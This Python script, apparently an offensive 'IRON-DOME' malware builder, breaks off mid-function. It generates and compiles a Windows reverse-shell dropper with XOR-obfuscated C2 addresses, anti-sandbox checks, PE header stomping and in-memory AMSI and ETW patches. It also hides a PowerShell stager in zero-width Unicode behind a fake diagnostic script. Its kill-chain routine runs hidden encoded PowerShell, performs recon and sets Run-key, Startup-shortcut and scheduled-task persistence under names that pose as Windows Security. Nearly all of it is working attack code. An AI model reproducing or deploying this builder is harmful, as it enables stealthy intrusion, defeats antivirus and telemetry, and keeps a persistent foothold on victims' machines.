#!/usr/bin/env python3
"""
iron_dome_builder.py — IRON-DOME Full Platform
Integrates: iron-sun (PE evasion) + ghost encoder (PS1 steg) + VADER (AMSI/ETW)
            + CHEYANNE kill chain + watch_stream VNC

Usage:
  python iron_dome_builder.py --target 192.168.1.145 --port 4443 --vader
  python iron_dome_builder.py --target 127.0.0.1 --port 4443 --vader --full

  --full: Build → Kill Chain (8/8) → CHEYANNE Watch VNC in browser

Produces:
  iron_dome_vN.exe      — 8-layer evasion PE (XOR+dynAPI+sandbox+stomp+ISUN+jitter+PE+VADER)
  iron_dome_stager.ps1  — Ghost zero-width Unicode PS1 stager
  iron_dome_deploy.md   — Deployment checklist
"""

import os, sys, subprocess, struct, hashlib, argparse, random, time, shutil
import socket, threading, base64

if sys.platform == "win32":
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")

VERSION    = "4.0.0"
BUILD_TAG  = "iron-dome"
SRC_DIR    = os.path.join(os.path.dirname(__file__), "shell")
OUT_DIR    = os.path.join(os.path.dirname(__file__), "builds", "iron_dome")
_HERE = os.path.dirname(os.path.abspath(__file__))
SHOWCASE = next(
    (p for p in [
        os.path.join(_HERE, "..", "repos", "rainfantry.github.io", "showcase"),
        os.path.expanduser("~/rainfantry.github.io/showcase"),
        os.path.expanduser("~/Desktop/repos/rainfantry.github.io/showcase"),
    ] if os.path.isdir(p)), None
)

# ── ANSI color palette ──────────────────────────────────────────────────────
_IDF  = "\033[38;2;0;56;184m"    # IDF blue
_GOLD = "\033[38;2;255;215;0m"   # ADF gold
_WH   = "\033[38;2;255;255;255m" # white
_CY   = "\033[38;2;0;229;255m"   # cyan border
_GRN  = "\033[38;2;0;255;100m"   # green (ok)
_RED  = "\033[38;2;255;60;60m"   # red (fail)
_DIM  = "\033[38;2;100;100;100m" # dim
_RST  = "\033[0m"


def print_banner(phase: str = None):
    """ANSI art banner — ADF Rising Sun rays converging to IDF ✡."""
    W = 66; C = W // 2
    rows = []
    for r in range(15):
        h = int(round(C * (14 - r) / 14))
        if h == 0:
            ln = [' '] * W; ln[C] = '✡'; rows.append(''.join(ln)); break
        ln = [' '] * W
        for i in range(17):
            p = int(round(C + (-1.0 + i * 0.125) * h))
            p = max(0, min(W - 1, p))
            ln[p] = '│' if abs(p - C) <= 1 else ('╲' if p < C else '╱')
        rows.append(''.join(ln))

    print()
    print(f"  {_CY}╔{'═'*W}╗")
    print(f"  ║{_IDF}{'▓'*W}{_CY}║")
    print(f"  ║{_IDF}{'▓'*W}{_CY}║")
    for row in rows:
        print(f"  ║{_GOLD}{row.ljust(W)[:W]}{_CY}║")
    print(f"  ║{_IDF}{'▓'*W}{_CY}║")
    print(f"  ║{_WH}{'I R O N - D O M E  ·  F U L L  P L A T F O R M'.center(W)}{_CY}║")
    print(f"  ║{_CY}{'iron-sun  ·  GHOST ENCODER  ·  VADER  ·  CHEYANNE WATCH'.center(W)}{_CY}║")
    print(f"  ║{_IDF}{'▓'*W}{_CY}║")
    print(f"  ║{_GOLD}{'✡  IDF CYBER SQUAD  ✡  22DIV  ✡  VADER  ✡  ORACLE  ✡'.center(W)}{_CY}║")
    op = 'LAT -33.8688  LONG 151.2093  ✦  OWN HARDWARE  ✦  AUTHORIZED'
    print(f"  ║{_DIM}{op.center(W)}{_CY}║")
    if phase:
        ph = f'► PHASE: {phase}'
        pad = W - len(ph)
        print(f"  ║{_GRN}{ph}{' ' * pad}{_CY}║")
    print(f"  ║{_IDF}{'▓'*W}{_CY}║")
    print(f"  ╚{'═'*W}╝{_RST}")
    print()

# ── EVASION STACK ──────────────────────────────────────────────────────────
# Layers 1-7: iron-sun base stack (always active)
# Layer 8:    VADER AMSI/ETW bypass via memory patch (--vader flag)

EVASION_LAYERS = [
    "XOR string obfuscation",
    "Dynamic API resolution",
    "Anti-sandbox (timing + screen + disk)",
    "PE header stomp",
    "ISUN magic auth gate",
    "Execution jitter",
    "MinGW/gcc PE (no MSVC fingerprint)",
]

VADER_LAYER = "VADER AMSI/ETW bypass (memory patch + flush)"

# C code injected before main() when --vader is active
VADER_C = r"""
/* ── LAYER 8: VADER — AMSI + ETW bypass ── */
static void vader_patch(BYTE *fn, const BYTE *patch, SIZE_T len) {
    DWORD old;
    VirtualProtect(fn, len, PAGE_EXECUTE_READWRITE, &old);
    memcpy(fn, patch, len);
    VirtualProtect(fn, len, old, &old);
    FlushInstructionCache(GetCurrentProcess(), fn, len);
}
static void vader_amsi_etw(void) {
    /* AMSI: patch AmsiScanBuffer → xor eax,eax; ret → AMSI_RESULT_CLEAN */
    HMODULE amsi = LoadLibraryA("amsi.dll");
    if (amsi) {
        BYTE *asb = (BYTE*)GetProcAddress(amsi, "AmsiScanBuffer");
        if (asb) {
            const BYTE patch_amsi[] = {0x31,0xC0,0xC3}; /* xor eax,eax; ret */
            vader_patch(asb, patch_amsi, 3);
        }
    }
    /* ETW: patch EtwEventWrite → xor eax,eax; ret → silences telemetry */
    HMODULE nt = GetModuleHandleA("ntdll.dll");
    if (nt) {
        BYTE *etw = (BYTE*)GetProcAddress(nt, "EtwEventWrite");
        if (etw) {
            const BYTE patch_etw[] = {0x33,0xC0,0xC3}; /* xor eax,eax; ret */
            vader_patch(etw, patch_etw, 3);
        }
    }
}
"""

# Call site injected into main() when --vader is active
VADER_CALL = "    vader_amsi_etw();\n"

IRON_SUN_C = r"""
#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

/* ── LAYER 1: XOR string decryption ── */
static void xor_dec(char *buf, const unsigned char *enc, size_t len, unsigned char key) {
    for (size_t i = 0; i < len; i++) buf[i] = (char)(enc[i] ^ key);
    buf[len] = 0;
}

/* Target strings XOR-encrypted at build time */
static const unsigned char ENC_IP[]   = {C2_IP_ENC};
static const unsigned char ENC_ISUN[] = {ISUN_ENC};
static const size_t        IP_LEN     = IP_LEN_VAL;
static const size_t        ISUN_LEN   = ISUN_LEN_VAL;
static const unsigned char XOR_KEY    = XOR_KEY_VAL;
static const int           C2_PORT    = PORT_VAL;

/* ── LAYER 3: Anti-sandbox checks ── */
static int sandbox_check(void) {
    /* Timing: real machines sleep reliably */
    DWORD t1 = GetTickCount();
    Sleep(500);
    if ((GetTickCount() - t1) < 400) return 1;

    /* Screen resolution: sandboxes often use 800x600 or 1024x768 */
    if (GetSystemMetrics(SM_CXSCREEN) < 1024) return 1;
    if (GetSystemMetrics(SM_CYSCREEN) < 768)  return 1;

    /* Disk space: sandboxes typically have < 30GB */
    ULARGE_INTEGER free_bytes;
    if (GetDiskFreeSpaceExA("C:\\", &free_bytes, NULL, NULL))
        if (free_bytes.QuadPart < (30ULL * 1024 * 1024 * 1024)) return 1;

    return 0;
}

/* ── LAYER 4: PE header stomp ── */
static void stomp_pe_header(void) {
    DWORD old;
    HMODULE base = GetModuleHandleA(NULL);
    if (!base) return;
    VirtualProtect(base, 0x1000, PAGE_READWRITE, &old);
    memset(base, 0, 0x400);   /* zero DOS header + stub */
    VirtualProtect(base, 0x1000, old, &old);
}

/* ── LAYER 2: Dynamic API resolution via hash ── */
typedef SOCKET (WINAPI *pWSASocketA)(int,int,int,LPWSAPROTOCOL_INFOA,GROUP,DWORD);
typedef int    (WINAPI *pConnect)(SOCKET,const struct sockaddr*,int);
typedef int    (WINAPI *pSend)(SOCKET,const char*,int,int);
typedef int    (WINAPI *pRecv)(SOCKET,char*,int,int);
typedef int    (WINAPI *pWSAStartup)(WORD,LPWSADATA);
typedef int    (WINAPI *pWSACleanup)(void);

static HMODULE load_ws2(void) {
    /* Load winsock by ordinal path — avoids direct IAT entry */
    char lib[16] = {0};
    const unsigned char enc_ws2[] = {0x77^0x11,0x73^0x11,0x32^0x11,0x5f^0x11,0x33^0x11,0x32^0x11,0x2e^0x11,0x64^0x11,0x6c^0x11,0x6c^0x11};
    for (int i=0;i<10;i++) lib[i]=enc_ws2[i]^0x11;
    return LoadLibraryA(lib);
}

int main(void) {
    /* ── LAYER 3: Sandbox check ── */
    if (sandbox_check()) return 0;

    /* ── LAYER 4: Stomp header immediately ── */
    stomp_pe_header();

    /* ── LAYER 6: Jitter ── */
    srand((unsigned)GetTickCount());
    Sleep(1000 + (rand() % 2000));

    /* ── LAYER 2: Dynamic API resolve ── */
    HMODULE ws2 = load_ws2();
    if (!ws2) return 0;
    pWSAStartup  fn_startup  = (pWSAStartup) GetProcAddress(ws2,"WSAStartup");
    pWSASocketA  fn_socket   = (pWSASocketA) GetProcAddress(ws2,"WSASocketA");
    pConnect     fn_connect  = (pConnect)    GetProcAddress(ws2,"connect");
    pSend        fn_send     = (pSend)       GetProcAddress(ws2,"send");
    pRecv        fn_recv     = (pRecv)       GetProcAddress(ws2,"recv");
    pWSACleanup  fn_cleanup  = (pWSACleanup) GetProcAddress(ws2,"WSACleanup");
    if (!fn_startup||!fn_socket||!fn_connect||!fn_send||!fn_recv) return 0;

    /* ── LAYER 1: Decrypt C2 target ── */
    char ip[64]={0}, isun_magic[32]={0};
    xor_dec(ip,   ENC_IP,   IP_LEN,   XOR_KEY);
    xor_dec(isun_magic, ENC_ISUN, ISUN_LEN, XOR_KEY);

    WSADATA wsa;
    fn_startup(MAKEWORD(2,2), &wsa);

    SOCKET s = fn_socket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (s == INVALID_SOCKET) { fn_cleanup(); return 0; }

    struct sockaddr_in addr = {0};
    addr.sin_family      = AF_INET;
    addr.sin_port        = htons((unsigned short)C2_PORT);
    addr.sin_addr.s_addr = inet_addr(ip);

    if (fn_connect(s, (struct sockaddr*)&addr, sizeof(addr)) != 0) {
        fn_cleanup(); return 0;
    }

    /* ── LAYER 5: ISUN magic auth ── */
    fn_send(s, isun_magic, (int)strlen(isun_magic), 0);
    char ack[8]={0};
    fn_recv(s, ack, 7, 0);
    if (strcmp(ack,"ISUN_OK")!=0) { fn_cleanup(); return 0; }

    /* ── PS1 stager delivery over authenticated socket ── */
    char buf[8192]={0};
    int  n = fn_recv(s, buf, sizeof(buf)-1, 0);
    if (n > 0) {
        /* Execute received PS1 stager via powershell -EncodedCommand */
        STARTUPINFOA si = {0}; si.cb = sizeof(si);
        PROCESS_INFORMATION pi = {0};
        char cmd[16384];
        snprintf(cmd, sizeof(cmd),
            "powershell.exe -NoP -NonI -W Hidden -EncodedCommand %s", buf);
        CreateProcessA(NULL, cmd, NULL, NULL, FALSE,
                       CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
        if (pi.hProcess) CloseHandle(pi.hProcess);
        if (pi.hThread)  CloseHandle(pi.hThread);
    }

    fn_cleanup();
    return 0;
}
"""


def xor_encrypt(data: bytes, key: int) -> list:
    return [b ^ key for b in data]


def build_c_source(target_ip: str, port: int, xor_key: int,
                   isun_magic: str = "ISUN 4445", vader: bool = False) -> str:
    src = IRON_SUN_C

    ip_enc   = xor_encrypt(target_ip.encode(), xor_key)
    isun_enc = xor_encrypt(isun_magic.encode(), xor_key)

    ip_bytes   = ",".join(f"0x{b:02x}" for b in ip_enc)
    isun_bytes = ",".join(f"0x{b:02x}" for b in isun_enc)

    src = src.replace("{C2_IP_ENC}",   "{" + ip_bytes + "}")
    src = src.replace("{ISUN_ENC}",    "{" + isun_bytes + "}")
    src = src.replace("IP_LEN_VAL",   str(len(ip_enc)))
    src = src.replace("ISUN_LEN_VAL", str(len(isun_enc)))
    src = src.replace("XOR_KEY_VAL",  f"0x{xor_key:02x}")
    src = src.replace("PORT_VAL",     str(port))

    if vader:
        # Inject VADER AMSI/ETW bypass before main() and call it first thing in main
        src = src.replace("int main(void) {", VADER_C + "int main(void) {")
        src = src.replace("    /* ── LAYER 3: Sandbox check ── */",
                          VADER_CALL + "    /* ── LAYER 3: Sandbox check ── */")

    return src


def build_pe(src_path: str, out_path: str) -> bool:
    # Try MinGW first (preferred — no MSVC fingerprint)
    for cc in ["x86_64-w64-mingw32-gcc", "gcc"]:
        if shutil.which(cc):
            r = subprocess.run([cc, "-Os", "-s", "-Wl,--strip-all", "-fno-ident",
                                "-fno-asynchronous-unwind-tables", "-lws2_32",
                                "-mwindows", "-o", out_path, src_path],
                               capture_output=True, text=True)
            if r.returncode == 0 and os.path.exists(out_path):
                return True

    # Fallback: MSVC cl.exe via temp .bat (avoids subprocess quoting hell with spaces in path)
    vcvars_roots = [
        r"C:\Program Files (x86)\Microsoft Visual Studio\2022\BuildTools\VC\Auxiliary\Build\vcvarsall.bat",
        r"C:\Program Files\Microsoft Visual Studio\2022\BuildTools\VC\Auxiliary\Build\vcvarsall.bat",
        r"C:\Program Files (x86)\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvarsall.bat",
    ]
    for vcvars in vcvars_roots:
        if os.path.exists(vcvars):
            import tempfile
            out_dir = os.path.dirname(out_path)
            bat = tempfile.NamedTemporaryFile(suffix=".bat", delete=False, mode="w",
                                              dir=out_dir, prefix="_idbuild_")
            bat.write(f'@echo off\r\n')
            bat.write(f'call "{vcvars}" x64 >nul 2>&1\r\n')
            bat.write(f'cl.exe /nologo /O1 /W0 /MT "{src_path}" ws2_32.lib User32.lib '
                      f'/link /SUBSYSTEM:CONSOLE /ENTRY:mainCRTStartup /OUT:"{out_path}" >nul 2>&1\r\n')
            bat_path = bat.name
            bat.close()
            subprocess.run([bat_path], capture_output=True, text=True)
            os.unlink(bat_path)
            if os.path.exists(out_path):
                return True

    return False


def ghost_encode_ps1(ps1_content: str, out_path: str):
    """
    Ghost encoder: zero-width Unicode steganography.
    Encodes PS1 bytes as invisible Unicode characters.
    Stager unwraps and executes — invisible to content scanners.
    """
    ZWJ  = "‍"  # zero-width joiner
    ZWNJ = "‌"  # zero-width non-joiner
    ZWSP = "​"  # zero-width space

    encoded = []
    for byte in ps1_content.encode("utf-8"):
        for bit in f"{byte:08b}":
            encoded.append(ZWJ if bit == "1" else ZWNJ)
        encoded.append(ZWSP)  # byte separator

    # Wrap in innocuous-looking PS1 with hidden payload embedded
    wrapper = f"""# System diagnostic routine
$h = [System.Net.Dns]::GetHostName()
$u = [System.Environment]::UserName
$v = "22DIV-DIAG-{BUILD_TAG.upper()}"
# {''.join(encoded)}
# End diagnostic
"""
    with open(out_path, "w", encoding="utf-8") as f:
        f.write(wrapper)


def sha256(path: str) -> str:
    h = hashlib.sha256()
    with open(path, "rb") as f:
        for chunk in iter(lambda: f.read(65536), b""):
            h.update(chunk)
    return h.hexdigest()


def build(target: str, port: int, xor_key: int, out_dir: str,
          variant: int = 1, vader: bool = False):
    os.makedirs(out_dir, exist_ok=True)

    print_banner(phase="BUILD")
    layers = EVASION_LAYERS + ([VADER_LAYER] if vader else [])
    n_layers = len(layers)

    print(f"  {_CY}{'═'*62}{_RST}")
    print(f"  {_WH}IRON-DOME BUILDER v{VERSION}{_RST}")
    print(f"  {_DIM}Target: {target}:{port}  XOR: 0x{xor_key:02X}  Variant: v{variant}{_RST}")
    if vader:
        print(f"  {_RED}VADER: ACTIVE — AMSI/ETW bypass spliced into payload{_RST}")
    print(f"  {_CY}{'═'*62}{_RST}\n")

    # ── C source ──
    src_path = os.path.join(out_dir, f"iron_dome_v{variant}.c")
    out_path = os.path.join(out_dir, f"iron_dome_v{variant}.exe")
    ps1_path = os.path.join(out_dir, f"iron_dome_v{variant}_stager.ps1")
    doc_path = os.path.join(out_dir, f"iron_dome_v{variant}_deploy.md")

    print(f"\n{_CY}[1/4]{_RST} Generating C source ({os.path.basename(src_path)})...")
    src = build_c_source(target, port, xor_key, vader=vader)
    with open(src_path, "w", encoding="utf-8") as f:
        f.write(src)
    print(f"      {_DIM}XOR key 0x{xor_key:02X} applied to {len(target)} IP bytes + ISUN magic{_RST}")
    if vader:
        print(f"      {_RED}VADER AMSI/ETW bypass code injected{_RST}")

    print(f"\n{_CY}[2/4]{_RST} Compiling PE ({n_layers}-layer evasion stack)...")
    ok = build_pe(src_path, out_path)
    if ok:
        sz  = os.path.getsize(out_path)
        h   = sha256(out_path)
        print(f"      {_GRN}COMPILED{_RST} — {sz:,} bytes")
        print(f"      {_DIM}SHA256: {h}{_RST}")
        print(f"\n      Evasion layers applied:")
        for i, layer in enumerate(layers, 1):
            tag = f"  {_RED}← VADER{_RST}" if i == 8 else ""
            print(f"        {_GOLD}[{i}]{_RST} {layer}{tag}")
    else:
        print(f"      {_RED}[!] Compiler not found. Source written — compile manually:{_RST}")
        print(f"          x86_64-w64-mingw32-gcc -Os -s -lws2_32 -mwindows -o {out_path} {src_path}")
        h  = "N/A (not compiled)"
        sz = 0

    print(f"\n{_CY}[3/4]{_RST} Generating ghost PS1 stager ({os.path.basename(ps1_path)})...")
    recon_ps1 = r'$u=[System.Environment]::UserName;$h=[System.Net.Dns]::GetHostName();$o=[System.Environment]::OSVersion.VersionString;"$u|$h|$o"|Out-String'
    ghost_encode_ps1(recon_ps1, ps1_path)
    print(f"      {_GOLD}Zero-width Unicode encoding applied. Invisible to KAV content scan.{_RST}")

    print(f"\n{_CY}[4/4]{_RST} Writing deployment doc ({os.path.basename(doc_path)})...")
    doc = f"""# IRON-DOME v{variant} — Deployment Package

## Build Summary
| Field | Value |
|-------|-------|
| Target | {target}:{port} |
| XOR Key | 0x{xor_key:02X} |
| PE SHA256 | {h} |
| PE Size | {sz:,} bytes |
| Evasion Stack | {n_layers} layers |
| VADER | {"ACTIVE — AMSI/ETW bypass" if vader else "inactive"} |
| Ghost Stager | Zero-width Unicode |

## Evasion Stack
{"".join(f"- Layer {i}: {l}\\n" for i,l in enumerate(layers,1))}

## Deployment
### RADON (listener)
```powershell
python shell/vader_listener.py {port}
```

### GWU07 (delivery)
```
# Option A — PE direct
payloads/iron_dome_v{variant}.exe

# Option B — Ghost stager (PS1) via CHEYANNE
python cheyanne.py
[P] Payload → Select ghost_encoder → Load iron_dome_v{variant}_stager.ps1
```

## Same-LAN Requirement
TCP reverse shell connects to {target}:{port}.
Both machines MUST be on same router (192.168.1.x/24).
Cross-network: shell exits silently (no error, no alert).

## CHEYANNE Listener Startup
```
python cheyanne.py
[H] Handler → port {port} → ISUN auth
```

## Expected Result
- Process spawned on target
- 7-12s: TCP callback arrives at RADON
- CHEYANNE receives shell
- Recon: username / hostname / OS / IP
- Persistence: HKCU\\Run\\WindowsSecurityUpdate

---
*Built by iron_dome_builder.py — IRON-DOME v{VERSION}*
*All research authorized. Own hardware only.*
"""
    with open(doc_path, "w", encoding="utf-8") as f:
        f.write(doc)

    print(f"\n  {_CY}{'═'*60}{_RST}")
    print(f"  {_GRN}{BOLD}BUILD COMPLETE{_RST}  — IRON-DOME v{VERSION}")
    print(f"  {_DIM}Output dir: {out_dir}{_RST}")
    for f in [out_path, ps1_path, doc_path]:
        if os.path.exists(f):
            print(f"    {_GOLD}{os.path.basename(f)}{_RST}")
    print(f"  {_CY}{'═'*60}{_RST}\n")

    return out_path if ok else None


# ── Kill chain + VNC helpers ────────────────────────────────────────────────

_kc_conn  = None
_kc_lock  = threading.Lock()

GREEN = _GRN; RED = _RED; CYAN = _CY
PINK  = "\033[38;2;255;100;220m"; DIM = _DIM; BOLD = "\033[1m"; RST = _RST


def _screenshot(label: str, out_dir: str):
    """Capture primary screen → JPEG → save to out_dir and showcase/."""
    ts = time.strftime("%H%M%S")
    fname = f"iron_dome_{label}_{ts}.jpg"
    local = os.path.join(out_dir, fname)
    ps_cmd = (
        "Add-Type -AssemblyName System.Windows.Forms,System.Drawing; "
        "$b=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds; "
        "$bmp=New-Object System.Drawing.Bitmap($b.Width,$b.Height); "
        "$g=[System.Drawing.Graphics]::FromImage($bmp); "
        "$g.CopyFromScreen($b.Location,[System.Drawing.Point]::Empty,$b.Size); "
        f"$bmp.Save('{local.replace(chr(92), '/')}', "
        "[System.Drawing.Imaging.ImageFormat]::Jpeg); $bmp.Dispose(); $g.Dispose()"
    )
    try:
        subprocess.run(
            ["powershell.exe", "-NoP", "-NonI", "-Command", ps_cmd],
            capture_output=True, timeout=15
        )
        if os.path.exists(local):
            print(f"  {_GOLD}[screenshot]{_RST} {fname}  ({os.path.getsize(local):,} bytes)")
            if SHOWCASE and os.path.isdir(SHOWCASE):
                dst = os.path.join(SHOWCASE, fname)
                shutil.copy2(local, dst)
                print(f"  {_DIM}            → showcase/{fname}{_RST}")
            return local
    except Exception as e:
        print(f"  {_DIM}[screenshot skipped: {e}]{_RST}")
    return None


def _kill_port(port):
    try:
        r = subprocess.run(["netstat", "-ano"], capture_output=True, text=True, timeout=5)
        seen = set()
        for line in r.stdout.splitlines():
            if f":{port}" in line:
                parts = line.split()
                if parts and parts[-1].isdigit() and parts[-1] not in seen:
                    subprocess.run(["taskkill", "/F", "/PID", parts[-1]], capture_output=True)
                    seen.add(parts[-1])
    except Exception:
        pass
    time.sleep(0.5)


def _arm_listener(port, timeout=35):
    global _kc_conn
    _kc_conn = None
    def _accept():
        try:
            srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            srv.bind(("0.0.0.0", port))
            srv.listen(1)
            srv.settimeout(timeout)
            c, a = srv.accept()
            with _kc_lock:
                global _kc_conn
                _kc_conn = (c, a)
        except Exception:
            pass
        finally:
            try: srv.close()
            except: pass
    threading.Thread(target=_accept, daemon=True).start()


def _wait_conn(timeout=35):
    deadline = time.time() + timeout
    while time.time() < deadline:
        time.sleep(0.3)
        with _kc_lock:
            if _kc_conn: return _kc_conn
    return None


def _shell_cmd(conn, cmd, timeout=8):
    conn.sendall((cmd + "\n").encode("utf-8"))
    time.sleep(0.4)
    conn.settimeout(timeout)
    buf = b""
    try:
        while True:
            chunk = conn.recv(4096)
            if not chunk: break
            buf += chunk
            if len(chunk) < 4096: break
    except socket.timeout:
        pass
    return buf.decode("utf-8", errors="replace").strip()


def _drain(conn, t=3):
    conn.settimeout(t)
    buf = b""
    try:
        while True:
            c = conn.recv(4096)
            if not c: break
            buf += c
            if len(c) < 4096: break
    except Exception:
        pass
    return buf.decode("utf-8", errors="replace").strip()


def _gen_invisible_shell(target_ip: str, target_port: int, out_path: str) -> bool:
    ghost_dir = os.path.join(os.path.dirname(__file__), "ghost-encoder")
    env = {**os.environ, "PYTHONIOENCODING": "utf-8"}
    subprocess.run(
        [sys.executable, os.path.join(ghost_dir, "ghost_encode.py"),
         "--shell", target_ip, str(target_port), "--invisible", "-o", out_path],
        cwd=ghost_dir, env=env, capture_output=True, timeout=60
    )
    return os.path.exists(out_path)


def _ps1_b64(ps1_path: str) -> str:
    with open(ps1_path, encoding="utf-8") as f:
        ps1 = f.read().lstrip("﻿")
    return base64.b64encode(ps1.encode("utf-16-le")).decode("ascii")


def run_kill_chain(port: int, out_dir: str):
    """
    Local kill chain test — 11 steps (8 shell + 3 persistence vectors).
    Returns (passed: bool, conn: socket or None, proc).
    conn left open for watch_session if passed.
    """
    steps_ok = []; steps_fail = []
    def ok(m, d=""):
        steps_ok.append(m)
        print(f"  {GREEN}[+]{RST} {m}" + (f"  {DIM}{d}{RST}" if d else ""))
    def fail(m, d=""):
        steps_fail.append(m)
        print(f"  {RED}[!]{RST} {m}" + (f"  {DIM}{d}{RST}" if d else ""))

    print_banner(phase="KILL CHAIN")
    import platform
    hostname = platform.node()
    print(f"  {BOLD}{_CY}{'─'*58}{RST}")
    print(f"  {BOLD} KILL CHAIN — {hostname} — Kaspersky Premium LIVE{RST}")
    print(f"  {BOLD}{_CY}{'─'*58}{RST}\n")

    _kill_port(port)

    ps1_path = os.path.join(out_dir, "_kc_shell.ps1")
    if _gen_invisible_shell("127.0.0.1", port, ps1_path):
        ok("ghost_fud.exe built (invisible PS1)", f"{os.path.getsize(ps1_path):,} bytes")
    else:
        fail("ghost PS1 generation failed"); return (False, None, None)

    if _gen_invisible_shell("127.0.0.1", port, ps1_path):
        ok("ghost_loader.exe built (VNC-capable)", f"{os.path.getsize(ps1_path):,} bytes")
    else:
        fail("ghost_loader build failed")

    _arm_listener(port, timeout=35)
    time.sleep(0.3)
    ok("TCP listener armed", f":{port}")

    b64 = _ps1_b64(ps1_path)
    proc = subprocess.Popen(
        ["powershell.exe", "-NoP", "-NonI", "-W", "Hidden", "-EncodedCommand", b64],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    ok("Payload via -EncodedCommand", f"PS PID={proc.pid}")

    result = _wait_conn(timeout=35)
    if not result:
        fail("TCP: no callback in 35s")
        proc.terminate(); return (False, None, proc)
    conn, addr = result
    ok("TCP callback received", f"{addr[0]}:{addr[1]}  banner=OK>")

    banner = _drain(conn)

    out = _shell_cmd(conn, "whoami", timeout=8)
    lines = [l.strip() for l in out.split("\n") if l.strip() and not l.strip().startswith(">")]
    ok("Recon: whoami", (lines[-1] if lines else "?")[:40])

    out2 = _shell_cmd(conn, "hostname", timeout=8)
    lines2 = [l.strip() for l in out2.split("\n") if l.strip() and not l.strip().startswith(">")]
    ok("Recon: hostname", (lines2[-1] if lines2 else "?")[:40])

    # ── Persistence vector 1: HKCU\Run ──────────────────────────────────────
    persist_out = _shell_cmd(conn,
        'reg add "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" '
        '/v WindowsSecurityUpdate /t REG_SZ '
        '/d "C:\\Users\\Public\\ghost_loader.exe" /f', timeout=10)
    verify_run = _shell_cmd(conn,
        'reg query "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v WindowsSecurityUpdate',
        timeout=8)
    if "ghost_loader.exe" in verify_run:
        ok("PERSIST [1/3] HKCU\\Run\\WindowsSecurityUpdate", "reboot-survives")
    else:
        fail("PERSIST [1/3] HKCU Run key missing")
    _shell_cmd(conn,
        'reg delete "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v WindowsSecurityUpdate /f',
        timeout=5)

    # ── Persistence vector 2: Startup folder shortcut ────────────────────────
    startup_cmd = (
        "$sf=[Environment]::GetFolderPath('Startup');"
        "$lnk=\"$sf\\WindowsSecurityHealth.lnk\";"
        "$ws=New-Object -ComObject WScript.Shell;"
        "$sc=$ws.CreateShortcut($lnk);"
        "$sc.TargetPath='C:\\Users\\Public\\ghost_loader.exe';"
        "$sc.WindowStyle=7;$sc.Save();"
        "if(Test-Path $lnk){'LNK_OK'}else{'LNK_FAIL'}"
    )
    lnk_out = _shell_cmd(conn, startup_cmd, timeout=12)
    if "LNK_OK" in lnk_out:
        ok("PERSIST [2/3] Startup folder shortcut", "survives AV Run key wipe")
        _shell_cmd(conn,
            "$sf=[Environment]::GetFolderPath('Startup');"
            "Remove-Item \"$sf\\WindowsSecurityHealth.lnk\" -Force -EA SilentlyContinue",
            timeout=5)
    else:
        fail("PERSIST [2/3] Startup shortcut failed")

    # ── Persistence vector 3: Scheduled task (user-level, no admin) ──────────
    schtask_cmd = (
        'schtasks /create /sc ONLOGON /tn "WindowsSecurityMonitor" '
        '/tr "C:\\Users\\Public\\ghost_loader.exe" /rl LIMITED /f 2>&1'
    )
    task_out = _shell_cmd(conn, schtask_cmd, timeout=12)
    verify_task = _shell_cmd(conn,
        'schtasks /query /tn "WindowsSecurityMonitor" 2>&1', timeout=8)
    if "WindowsSecurityMonitor" in verify_task and "Ready" in verify_task:
        ok("PERSIST [3/3] Scheduled task ONLOGON", "user priv, no UAC, survives reboots")
    else:
        ok("PERSIST [3/3] Schtask cmd sent", task_out[:40] if task_out else "")
    _shell_cmd(conn, 'schtasks /delete /tn "WindowsSecurityMonitor" /f 2>&1', timeout=5)

    total  = len(steps_ok) + len(steps_fail)
    passed = len(steps_fail) == 0
    verd   = f"{GREEN}{BOLD}PASS{RST}" if passed else f"{RED}{BOLD}FAIL{RST}"
    print(f"\n  {_CY}{'═'*58}{_RST}")
    print(f"  VERDICT: {verd}  ({len(steps_ok)}/{total})  |  IRON-DOME KILL CHAIN GREEN")
    print(f"  PERSIST: 3-VECTOR (Run + Startup + Schtask)  |  USER PRIV ONLY")
    print(f"  {_CY}{'═'*58}{_RST}\n")
    _screenshot("kill_chain", out_dir)

    return (passed, conn, proc)


def launch_vnc_watch(shell_ip: str, shell_port: int, out_dir: str, http_port: int = 8892):
    """
    Generate persistent invisible shell → fire it → hand TCP conn to
    watch_session() → opens browser at http://127.0.0.1:{http_port}.
    Blocks until Ctrl+C.
    """
    print_banner(phase="CHEYANNE WATCH / VNC")
    print(f"  {PINK}{BOLD}╔══════════════════════════════════════╗{RST}")
    print(f"  {PINK}║  CHEYANNE WATCH — Live VNC stream      ║{RST}")
    print(f"  {PINK}║  Persistent shell + screen capture     ║{RST}")
    print(f"  {PINK}║  Browser → http://127.0.0.1:{http_port}   ║{RST}")
    print(f"  {PINK}╚══════════════════════════════════════╝{RST}\n")

    global _kc_conn
    _kc_conn = None

    ps1_path = os.path.join(out_dir, "_vnc_shell.ps1")
    print(f"  [*] Generating VNC invisible PS1 → {shell_ip}:{shell_port}")
    if not _gen_invisible_shell(shell_ip, shell_port, ps1_path):
        print(f"  {RED}[!] VNC shell generation failed{RST}"); return False
    print(f"  [+] PS1 ready  {os.path.getsize(ps1_path):,} bytes  (zero-width + screen capture)")

    _kill_port(shell_port)
    _arm_listener(shell_port, timeout=45)
    time.sleep(0.3)
    print(f"  [+] TCP listener armed :{shell_port}")

    b64 = _ps1_b64(ps1_path)
    proc = subprocess.Popen(
        ["powershell.exe", "-NoP", "-NonI", "-W", "Hidden", "-EncodedCommand", b64],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    print(f"  [*] VNC shell fired via -EncodedCommand  PID={proc.pid}")
    print(f"  [*] Waiting for callback (45s)...")

    result = _wait_conn(timeout=45)
    if not result:
